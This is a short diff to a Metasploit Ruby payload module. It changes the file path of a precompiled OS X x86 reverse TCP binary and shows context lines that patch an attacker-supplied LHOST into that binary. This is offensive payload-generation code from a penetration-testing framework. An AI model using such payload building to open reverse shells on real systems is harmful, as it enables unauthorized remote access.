@@ -65,7 +65,7 @@ module Metasploit3
   end
 
   def generate(*args)
-    bin = ::File.read(::File.join(Msf::Config.data_directory, 'osx', 'reverse_tcp_x86.bin'), {:mode => 'rb'})
+    bin = ::File.read(::File.join(Msf::Config.data_directory, 'meterpreter', 'osx_reverse_tcp_x86.bin'), {:mode => 'rb'})
     
     if datastore['LHOST']
       bin = string_sub(bin, 'XXXX127.0.0.1      ', "XXXX" + datastore['LHOST'].to_s)
